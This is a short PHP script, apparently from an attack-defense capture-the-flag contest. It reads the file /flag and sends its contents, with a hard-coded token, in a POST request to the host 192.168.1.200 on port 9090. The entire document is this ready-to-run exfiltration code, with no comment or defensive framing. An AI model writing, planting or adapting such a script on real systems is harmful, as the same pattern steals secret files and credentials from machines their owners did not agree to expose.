<?php
$flag=trim(file_get_contents("/flag"));
$postdata=['flag'=>$flag,'token'=>'6902687edf7fa80889bc56080687a290'];
//$postdata=http_build_query($postdata);

$ch=curl_init();
$url="http://192.168.1.200:9090/";
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
//curl_setopt($ch, CURLOPT_COOKIE, "a=b;c=d;");
curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
$output = curl_exec($ch);
curl_close($ch);


?>